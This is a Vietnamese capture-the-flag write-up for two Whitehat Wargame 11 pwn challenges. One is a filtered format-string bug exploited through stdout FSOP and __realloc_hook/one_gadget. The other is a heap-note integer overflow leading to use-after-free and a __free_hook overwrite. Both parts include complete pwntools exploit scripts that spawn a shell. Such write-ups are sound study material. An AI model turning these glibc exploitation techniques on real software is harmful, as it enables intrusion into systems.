---
layout: post
title:  "Writeup Whitehat Wargame 11"
categories: binary
tags: binary pwn
author: th3_5had0w
mathjax: true
---

* content
{:toc}

Writeup vài bài pwn Whitehat Wargame 11




## Pwn6

Nhìn sơ qua thì đây là một câu format string nhưng bị filter hết các kí tự dùng để leak như 'd', 's', 'u',... và một vài kí tự khác thuộc chuỗi '/bin/sh', 'cat',...
```c
────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 ► 0x5628855b6325 <main+68>     call   fgets@plt                <fgets@plt>
        s: 0x7fff7b1f4a50 —▸ 0x5628855b5040 ◂— 0x400000006
        n: 0x50
        stream: 0x7f6f40e76980 (_IO_2_1_stdin_) ◂— 0xfbad208b
 
   0x5628855b632a <main+73>     lea    rax, [rbp - 0x60]
   0x5628855b632e <main+77>     mov    rdi, rax
   0x5628855b6331 <main+80>     call   restricted_filter                <restricted_filter>
 
   0x5628855b6336 <main+85>     cmp    eax, -1
   0x5628855b6339 <main+88>     jne    main+100                <main+100>
 
   0x5628855b633b <main+90>     mov    edi, 1
   0x5628855b6340 <main+95>     call   exit@plt                <exit@plt>
 
   0x5628855b6345 <main+100>    lea    rax, [rbp - 0x60]
   0x5628855b6349 <main+104>    mov    rdi, rax
   0x5628855b634c <main+107>    mov    eax, 0
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rax rdi rsp 0x7fff7b1f4a50 —▸ 0x5628855b5040 ◂— 0x400000006
01:0008│             0x7fff7b1f4a58 ◂— 0xf0
02:0010│             0x7fff7b1f4a60 ◂— 0xc2
03:0018│             0x7fff7b1f4a68 —▸ 0x7fff7b1f4a97 ◂— 0x5628855b610000
04:0020│             0x7fff7b1f4a70 —▸ 0x7fff7b1f4a96 ◂— 0x5628855b61000000
05:0028│             0x7fff7b1f4a78 —▸ 0x5628855b63ad (__libc_csu_init+77) ◂— add    rbx, 1
06:0030│             0x7fff7b1f4a80 —▸ 0x7f6f40e7b2e8 (__exit_funcs_lock) ◂— 0x0
07:0038│             0x7fff7b1f4a88 —▸ 0x5628855b6360 (__libc_csu_init) ◂— endbr64 
───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0   0x5628855b6325 main+68
   f 1   0x7f6f40cae083 __libc_start_main+243
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p stdout
$4 = (FILE *) 0x7f6f40e776a0 <_IO_2_1_stdout_>
pwndbg> x 0x7f6f40e7b2e8 - 0x7f6f40e776a0
0x3c48:	Cannot access memory at address 0x3c48
pwndbg> 

```

### Vulnerability

Vì binary không cho phép ta leak bất cứ thứ gì cũng như không có buffer overflow mà cần phải leak thì mình nghĩ ngay đến FSOP, cụ thể leak libc bằng cách format string để overwrite stdout.

Chỉ cần debug sơ qua cũng có thể thấy tại địa 0x7fff7b1f4a80 có chứa một con trỏ khá gần với stdout, chỉ khác nhau 2 byte cuối, theo như ta đã biết thì 3 số cuối của mỗi symbols, gadget trong libc phụ thuộc vào 3 số cuối không đổi, nếu khác nhau từ 3 đến 4 số có nghĩa là 2 địa chỉ trên có 2 byte khác nhau, vậy có nghĩa ta phải brute để có được địa chỉ của stdout, khả năng thành công là 1/16.

Nhưng với hàm fgets thì ta nhận thấy không thể padding lên rồi ghi đè 2 byte cuối của địa chỉ theo cách thông thường vì fgets chỉ dừng đọc khi có EOF hoặc newline (kí tự xuống dòng / enter) và sẽ tự thêm một nullbyte vào cuối chuỗi mà ta nhập vào:
```
fgets()  reads in at most one less than size characters from stream and stores them into the buffer pointed to by s. Reading stops after an EOF or a newline. If a newline is read, it is stored into the buffer. A terminating null byte ('\0') is stored after the last character in the buffer.
```

Tiếp đến nếu để ý tại chỉ 0x7fff7b1f4a68 ta sẽ thấy nó chứa con trỏ trỏ đến địa chỉ 0x7fff7b1f4a97, khá gần với địa chỉ 0x7fff7b1f4a80 đã nêu ở trên. Điều này có ý nghĩa gì? Trong quá trình debug mình nhận thấy byte cuối cùng của stack address luôn luôn thay đổi sau mỗi lần chạy theo một cách ngẫu nhiên (offset thay đổi 0x00, 0x10, 0x20, ... 0xe0, 0xf0), vậy nghĩa là sẽ có xác suất 1/16 địa chỉ của symbol __exit_funcs_lock sẽ nằm ở địa chỉ 0x7fff7b1f4a00 chứ không phải 0x7fff7b1f4a80 như ở trên.

Với những lợi thế trên ta có thể sử dụng trailing nullbyte từ fgets để overwrite byte cuối cùng tại địa chỉ 0x7fff7b1f4a68 từ 0x7fffffffdfd7 thành 0x7fff7b1f4a00, có xác suất 1/16 địa chỉ của symbol __exit_funcs_lock (0x7ffff7fc82e8) sẽ được con trỏ 0x7fff7b1f4a00 trỏ đến, thử chạy lại debug vài lần ta có thể thấy trường hợp trên một cách tường minh hơn:
```c
────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 ► 0x563282677325 <main+68>     call   fgets@plt                <fgets@plt>
        s: 0x7fff2517b9d0 —▸ 0x563282676040 ◂— 0x400000006
        n: 0x50
        stream: 0x7fb41b40e980 (_IO_2_1_stdin_) ◂— 0xfbad208b
 
   0x56328267732a <main+73>     lea    rax, [rbp - 0x60]
   0x56328267732e <main+77>     mov    rdi, rax
   0x563282677331 <main+80>     call   restricted_filter                <restricted_filter>
 
   0x563282677336 <main+85>     cmp    eax, -1
   0x563282677339 <main+88>     jne    main+100                <main+100>
 
   0x56328267733b <main+90>     mov    edi, 1
   0x563282677340 <main+95>     call   exit@plt                <exit@plt>
 
   0x563282677345 <main+100>    lea    rax, [rbp - 0x60]
   0x563282677349 <main+104>    mov    rdi, rax
   0x56328267734c <main+107>    mov    eax, 0
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rax rdi rsp 0x7fff2517b9d0 —▸ 0x563282676040 ◂— 0x400000006
01:0008│             0x7fff2517b9d8 ◂— 0xf0
02:0010│             0x7fff2517b9e0 ◂— 0xc2
03:0018│             0x7fff2517b9e8 —▸ 0x7fff2517ba17 ◂— 0x56328267710000
04:0020│             0x7fff2517b9f0 —▸ 0x7fff2517ba16 ◂— 0x5632826771000000
05:0028│             0x7fff2517b9f8 —▸ 0x5632826773ad (__libc_csu_init+77) ◂— add    rbx, 1
06:0030│             0x7fff2517ba00 —▸ 0x7fb41b4132e8 (__exit_funcs_lock) ◂— 0x0
07:0038│             0x7fff2517ba08 —▸ 0x563282677360 (__libc_csu_init) ◂— endbr64 
───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0   0x563282677325 main+68
   f 1   0x7fb41b246083 __libc_start_main+243
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

Vậy vector tấn công tạm thời sẽ như sau:
- Ghi đè byte cuối của stack address thành 0x00
- Format string attack vào stack address để thay đổi con trỏ trỏ đến địa chỉ __exit_funcs_lock thành con trỏ trỏ đến stdout (1/16)
- Format string attack vào stdout (1/16)

Vậy xác suất ghi đè là 1/256 (Server response thì chậm vkl... 🥳)

### Exploit

#### FSOP attack

3 file stream cơ bản stdin, stdout, stderr trong linux đều có type FILE*, type FILE thực chất là _IO_FILE struct.

Nhìn sơ qua [_IO_FILE struct](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/bits/types/struct_FILE.h#L49) trong glibc 2.31:
```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

Xem các giá trị stdout thông qua gdb ta có thể thấy stdout đang ở unbuffered mode (các con trỏ _IO_write_base, _IO_write_ptr, _IO_write_end,... đều trỏ đến địa chỉ giống nhau):
```c
pwndbg> p _IO_2_1_stdout_
$6 = {
  file = {
    _flags = -72537977,
    _IO_read_ptr = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7f6f40e77723 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7f6f40e77724 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7f6f40e76980 <_IO_2_1_stdin_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "\n",
    _lock = 0x7f6f40e787e0 <_IO_stdfile_1_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7f6f40e76880 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f6f40e734a0 <_IO_file_jumps>
}
```

Có 2 cách sử dụng FSOP attack ở đây:

1. Overwrite byte cuối của _IO_read_end và _IO_write_base
2. Overwrite giá trị của _flags và _IO_write_base

Ở đây mình chọn cách 2. Vậy là coi như đã leak được.

#### Overwrite one_gadget vào __malloc_hook?

Ở đây thì gặp một vấn đề là điều kiện của toàn bộ one_gadget trong libc được cung cấp khi __malloc_hook được trigger đều không thỏa mãn dẫn đến việc shell không spawn được.
```c
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Nếu ta để ý thì ngoài __free_hook, __malloc_hook là 2 target mà ta thường nhắm tới, còn có __realloc_hook, __memalign_hook,... Nhưng ở đây thì ta chỉ cần để ý đến __realloc_hook vì ta có thể thấy trong hàm realloc có kha khá các lệnh thanh đổi trực tiếp đến các thanh ghi nằm trong các điều kiện cần thỏa mãn của one_gadget:
```c
...
   0x00007f6f40d24ec0 <+64>:	pop    rbx
   0x00007f6f40d24ec1 <+65>:	pop    rbp
   0x00007f6f40d24ec2 <+66>:	pop    r12
   0x00007f6f40d24ec4 <+68>:	pop    r13
   0x00007f6f40d24ec6 <+70>:	pop    r14
   0x00007f6f40d24ec8 <+72>:	pop    r15
...
   0x00007f6f40d24f89 <+265>:	pop    rbx
   0x00007f6f40d24f8a <+266>:	pop    rbp
   0x00007f6f40d24f8b <+267>:	pop    r12
   0x00007f6f40d24f8d <+269>:	pop    r13
   0x00007f6f40d24f8f <+271>:	pop    r14
   0x00007f6f40d24f91 <+273>:	pop    r15
...
   0x00007f6f40d250e9 <+617>:	pop    rbx
   0x00007f6f40d250ea <+618>:	pop    rbp
   0x00007f6f40d250eb <+619>:	pop    r12
   0x00007f6f40d250ed <+621>:	pop    r13
   0x00007f6f40d250ef <+623>:	pop    r14
   0x00007f6f40d250f1 <+625>:	pop    r15
   0x00007f6f40d250f3 <+627>:	jmp    rax
```

Vậy thay vì overwrite one_gadget trực tiếp vào __malloc_hook, ta có thể overwrite one_gadget vào __realloc_hook và overwrite realloc()+offset vào __malloc_hook, offset cụ thể ở đây mình chọn là realloc()+24. Sau khi overwrite xong ta chỉ cần trigger malloc bằng %70000c là sẽ có được shell. Để hiểu rõ hơn bạn có thể thử debug script exploit sau đây của mình (nó brute vkl 1/256 nên thông cảm nếu nó chạy hơi lâu nhé... 🥵🥵🥵):
```python
from pwn import *
from time import sleep

BEDUG = False

context.clear(arch = 'amd64')
libc = ELF('./libc.so.6')

if BEDUG == True:
    io = process('./ez_fmt_patched')
    #gdb.attach(io, '''
    #b * main+112
    #continue
    #''')
else:
    io = remote('192.81.209.60', 2022)

io.recvuntil(b'ice :##\n')

def brutewrite_stdout():
    #pause()
    one = b'c'*23
    io.sendline(one)
    for i in range(4, 11):
        pone = b'\xa0'+p8(i * 0x10 + 6)
        nice = b'%'+str(u16(pone)).encode('utf-8')+b'c%9$hn'
        #sleep(1)
        io.sendline(nice)
        log.info('sending payload: '+nice.decode('utf-8'))
        ptwo = b'%'+str(0x3887).encode('utf-8')+b'c%12$hn'
        #sleep(1)
        io.sendline(ptwo)
        log.info('trying overwrite stdout: '+ptwo.decode('utf-8'))

    for i in range(4, 11):
        pone = b'\xc0'+p8(i * 0x10 + 6)
        nice = b'%'+str(u16(pone)).encode('utf-8')+b'c%9$hn'
        #sleep(1)
        io.sendline(nice)
        log.info('sending payload: '+nice.decode('utf-8'))
        ptwo = b'%12$hhn'
        #sleep(1)
        io.sendline(ptwo)
        log.info('trying overwrite stdout: '+ptwo.decode('utf-8'))


def brutetodead():
    global io
    tmp = b'concac'
    while (b'\x7f' not in tmp):
        try:
            tmp = io.recv(timeout = 0.3)
            #print(tmp.split())
            if (tmp == b''):
                print('DEADGE')
                if BEDUG == True:
                    io.kill()
                    io = process('./ez_fmt_patched')
                else:
                    io.close()
                    io = remote('192.81.209.60', 2022)
                brutewrite_stdout()
                io.recv(timeout = 0.3)
        except:
            if BEDUG == True:
                io.kill()
                io = process('./ez_fmt_patched')
            else:
                io.close()
                io = remote('192.81.209.60', 2022)
    leak = u64(tmp.split()[1][8:14]+b'\0\0')-0x1ec980
    return leak


def getbyte(nth, num):
    return (num >> (8*nth)) & 0xff

libc.address = brutetodead()
log.info('Libc: '+hex(libc.address))
log.info('__realloc_hook:'+hex(libc.sym['__realloc_hook']))
log.info('__malloc_hook: '+hex(libc.sym['__malloc_hook']))
numb = libc.sym['__malloc_hook'] & 0xffff

for i in range(6):
    nice = b'%'+str(numb+i).encode('utf-8')+b'c%9$hn'
    io.sendline(nice)
    bruh = b'%'+str(getbyte(i, libc.sym['realloc']+24)).encode('utf-8')+b'c%12$hhn'
    io.sendline(bruh)

p2 = fmtstr_payload(6, {libc.sym['__realloc_hook']:libc.address+0xe3afe}, 0, write_size='short').replace(b'a', b'!')
io.sendline(p2)
io.sendline(b'%70000c')
io.interactive()
```

## Pwn8

Lại là một heapnote challenge khác. 😀

### Vulnerability

Đầu tiên người đụng được phép nhập số lượng note cần dùng, sau đó hàm accessor_create sẽ được gọi để tạo ra một list rỗng dùng để lưu trữ các con trỏ note.
```c
_DWORD *__fastcall accessor_create(int a1)
{
  _DWORD *s; // [rsp+18h] [rbp-8h]

  if ( a1 <= 0 )
    return 0LL;
  s = malloc(8 * (a1 + 1));
  if ( !s )
    return 0LL;
  memset(s, 0, 8 * (a1 + 1));
  *s = a1;
  return s;
}
```

Nhìn vào ta nghĩ ngay đến integer overflow, ví dụ nếu ta nhập MAX_INT vào thì biểu thức trong malloc sẽ có kết quả như sau:

malloc(8 * (MAX_INT + 1));

<=> malloc(8 * 0);

<=> malloc(0);

malloc(0); sẽ cho ta một chunk có size 0x20, nhưng size do ta nhập vào là MAX_INT thì vẫn được giữ nguyên, vậy có nghĩa là ta được tùy ý viết hay đọc những con trỏ vào phạm vi ngoài chunk size 0x20 đó, từ đây ta có lỗi out-of-bound.

Sau khi nhập size, chương trình cho ta 2 lựa chọn, write và read.

Hàm read kiểm tra index i mà ta nhập vào, nếu thỏa điều kiện (i >= 0 và i < n với n là số lượng note ta nhập lúc đầu) thì in ra data mà con trỏ tại index i trỏ tới. Ta thấy có thể sử dụng nó để leak heap hoặc libc.
```c
v4 = read_int("Index: ");
s = (char *)accessor_reader(v9, v4);
if ( s )
    v5 = s;
else
    v5 = "[undefined]";
puts(v5);

__int64 __fastcall accessor_reader(int *a1, int a2)
{
  __int64 result; // rax

  if ( a2 >= 0 && a2 < *a1 )
    result = *(_QWORD *)&a1[2 * a2 + 2];
  else
    result = 0LL;
  return result;
}
```

Mỗi lần thực hiện chức năng write yêu cầu ta nhập index i để chọn vị trí lưu trữ và cấp phát cho ta một chunk có size là 0x40 (malloc(0x30) sẽ được round-up lên 0x40) rồi cho ta nhập data vào chunk đó. Nếu index i thỏa điều kiện (i >= 0 và i < n với n là số lượng note ta nhập lúc đầu):
- Nếu tại index i đã lưu trữ một con trỏ khác tạm gọi là con trỏ A thì vùng bộ nhớ mà con trỏ A trỏ đến sẽ được thu hồi, rồi chương trình sẽ thay thế con trỏ A tại index i bằng con trỏ trỏ đến vùng bộ nhớ mới được cấp phát cho ta ở trên.
- Nếu tại index i chưa lưu trữ con trỏ nào thì chương trình sẽ lưu trữ con trỏ trỏ đến vùng bộ nhớ mới được cấp phát cho ta ở trên vào index i.

Nếu index i không thỏa điều kiện thì bộ nhớ được cấp phát cho phép ta nhập dữ liệu vào sẽ được thu hồi và không có thay đổi nào tại index i.
```c
v8 = read_int("Index: ");
ptr = malloc(0x30uLL);
if ( ptr )
{
    read_string("Your data: ", (__int64)ptr, 48);
    if ( (unsigned int)accessor_writer(v9, v8, (__int64)ptr) == -1 )
        free(ptr);
}

__int64 __fastcall accessor_writer(int *a1, int a2, __int64 a3)
{
  if ( a2 < 0 || a2 >= *a1 )
    return 0xFFFFFFFFLL;
  if ( *(_QWORD *)&a1[2 * a2 + 2] )
    free(*(void **)&a1[2 * a2 + 2]);
  *(_QWORD *)&a1[2 * a2 + 2] = a3;
  return 0LL;
}
```

Chỉ cần sử dụng out of bound thì ta sẽ thấy việc leak heap khá là dễ, chỉ cần cấp phát một vùng bộ nhớ A sau đó cấp phát tiếp một vùng bộ nhớ B nữa sử dụng con trỏ lưu trữ tại index thuộc A, rồi chọn read vùng bộ nhớ A là có thể leak được heap.

### Exploit

Sau khi leak được heap thì ta lại có thêm 2 lỗi mới có thể sử dụng.
1. Ta có thể tạo ra các fake chunk để sửa chunk metadatas. Từ đây có thể tạo fake chunk để leak libc.
2. Use after free, cụ thể hãy xem minh họa sau đây:
```c
0x55b3545de170	0x0000000000000000	0x0000000000000041	........A.......
0x55b3545de180	0x000055b3545de180	0x0000000000000000	..]T.U..........
0x55b3545de190	0x0000000000000000	0x0000000000000000	................
0x55b3545de1a0	0x0000000000000000	0x0000000000000000	................
0x55b3545de1b0	0x0000000000000000	0x000000000001ee51	........Q.......	 <-- Top chunk
```

Nếu ta chọn write vào index i chứa con trỏ trỏ đến địa chỉ 0x000055b3545de180 thì đầu tiên chương trình sẽ free heap chunk ở hình trên (0x000055b3545de180), sau đó sẽ lưu trữ con trỏ mới vào đúng vị trí là forward pointer của chunk đã được free (0x000055b3545de180), vậy forward pointer đã được sửa đổi theo ý mình -> arbitrary write.

#### Leak libc?

Cách leak đơn giản nhưng hơi chày cối, cấp phát liên tục các chunk có size 0x40 để khi tạo đủ size 0x400 hoặc lớn hơn tùy ý, lúc free sẽ bị đưa vào unsortedbin vì 0x400 đã lớn hơn size của tcache.

#### Hijack __free_hook rồi spawn shell một cách dễ dàng?

Sau khi sử dụng lỗi use-after-free trên thì ta đã có thể có quyền write vào __free_hook? Cũng không hẳn là vậy, vì mỗi lần loop chương trình chỉ free tối đa 1 lần, có nghĩa là tcache chỉ nhận tối đa 1 chunk ở trong tcache bins. Để có thể tiếp tục sử dụng thêm chunk ở trong tcache bins (các entry trong tcache_perthread_struct) ta có thể free 1 fake chunk có size 0x290 sau đó free chunk tcache_perthread_struct có size 0x290 ở đầu heap sector, lúc này forward pointer sẽ ghi đè lên entry count của chunk size 0x40.

#### Một ý tưởng khác?

Trong quá trình làm mình có nghĩ đến một idea hơn điên khùng, đó là unsortedbin attack ghi đè main_arena lên entry của chunk size 0x40 ở tcache_perthread_struct, rồi sửa địa chỉ của top-chunk về lại tcache_perthread_struct để sửa entry của chunk size 0x40 thành __free_hook. Nhưng rồi quên mất lên libc-2.31 thì unsortedbin attack không còn available nữa... 🥺

Bạn có thể debug script sau nếu chưa hiểu rõ những ý tưởng mình trình bày ở trên :
```python
from pwn import *

BEDUG = True

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if BEDUG == True:
    io = process('./ruby')#, env={"LD_PRELOAD":"./libc.so.6"})
    gdb.attach(io)
else:
    io = remote()

io.sendlineafter(b' methods: ', b'2147483647')
def w(idx, dat):
    io.sendlineafter(b')> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode('utf-8'))
    io.sendafter(b'Your data: ', dat)

def c(idx):
    io.sendlineafter(b')> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode('utf-8'))

w(0, p64(0)*3+b'\x41\n')
w(1, p64(0)*3+b'\x41\n')
w(3, b'\n')
c(0)
heap = u64(io.recv(6)+b'\0\0') - 0x340
log.info('Heap: '+hex(heap))
cnt = 0
w(4, b'\n')
cnt+=1

for i in range(19, 26):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

for i in range(27, 34):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

for i in range(36, 42):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

w(44, p64(heap+0x2e0)+b'\n')
w(195, b'\n')
w(45, p64(0)*3+p64(0x441)+b'\n')
w(1, b'\n')
w(0, p64(heap+0x340)+p64(heap+0x4c0)+p64(heap+0x500)+p64(heap+0x4f0)+b'\n')
c(11)
libc.address = u64(io.recv(6)+b'\0\0') - 0x1ecbe0
stdout = libc.address + 0x1ed6a0
log.info('Libc: '+hex(libc.address))

'''
# this is for my madness unsortedbin idea but failed...
w(12, b'\n')
w(1000, p64(0)*5+b'\x41\n')
w(13, b'\n')
w(1001, p64(0)*5+b'\x41\n')
w(1002, b'\n')
w(1003, b'\n')
w(1004, b'\n')
w(1005, b'\n')
w(1006, b'\n')
w(14, b'\n')
#w(1007, p64(0)+p64(0x241)+p64(0)+p64(heap+0xa0-0x10)+b'\n')
#w(1008, b'\n')
'''

for i in range(17):
    w(1000+i, p64(heap+0x10)+b'\n')

current = 5000
ptrbase = heap + 0x980
ptrlist = heap + 0x2a8

freeptrlist = []

for count in range(7):
    for i in range(11):
        w(current, p64(current)+p64(0)*2+b'\x41\n')
        current += 1
    w(current, p64(0)+p64(0x41)+p64(ptrbase+0x20+count*0x300)+p64(ptrbase+0x40+count*0x300)+b'\n')
    current += 1
    freeptr = 0x135 + (count * 0x300) // 8
    freeptrlist.append(freeptr)
    print(hex(freeptr))


dummy = 10000
for count in range(6):
    w(freeptrlist[count], b'\n')
    w(dummy+count, p64(0)*3+p64(0x291)+b'\n')
    w(freeptrlist[count]+1, b'\n')

print(freeptrlist)

w(12000, p64(heap+0x2180)+b'\n')
w(-1, b'\n')
w(0x3db, p64(libc.sym['__free_hook'])+b'\n')
w(3, b'\n')
w(12001, b'/bin/sh'+b'\n')
w(12001, p64(libc.sym['system'])+b'\n')
io.interactive()
```